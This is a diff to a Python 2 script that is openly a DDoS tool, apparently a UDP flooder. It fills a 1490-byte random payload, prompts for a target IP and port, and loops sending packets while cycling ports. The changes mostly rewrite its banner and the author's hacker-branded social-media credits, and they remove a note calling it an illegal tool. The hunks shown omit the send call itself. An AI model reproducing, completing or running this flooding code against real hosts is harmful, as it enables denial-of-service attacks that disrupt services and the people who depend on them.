@@ -1,5 +1,4 @@
-print ("\033[91m")
-import "sys"
+import sys
 import os
 import time
 import socket
@@ -19,24 +18,18 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet Vip-DdoS")
+os.system("figlet DDos Attack")
 print
-print "Coded By : Mr.KrishnaGuptajii"
-print "Author   : KrishnaGuptajii"
-print "Github   : github.com/GuptajiiHacker"
-print "Fb Page  : facebook.com/KrishnaGupta"
-print "Instagram : Instagram.com/Its_Vip_Krishna_Gupta"
-print "Telegram : t.me/VipHacker"
-print " Use it on your own Risk@Vip"
-print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems@VipKrishna"
+print "Author   : KrishnaGupta"
+print "You Tube : https://www.youtube.com/channel/HackerGuptajii"
+print "github   : https://github.com/HackerGuptajii"
+print "Facebook : https://www.facebook.com/KrishnaGupta"
 print
-ip = raw_input("IP address Target : ")
-port = input("IP Port       : ")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
 os.system("clear")
-print("\033[93m")
-os.system("figlet VIP DdoS Attack")
-print("Coded by : HackerGuptajii")
-print ("\033[92m")
+os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
@@ -55,4 +48,4 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
+          
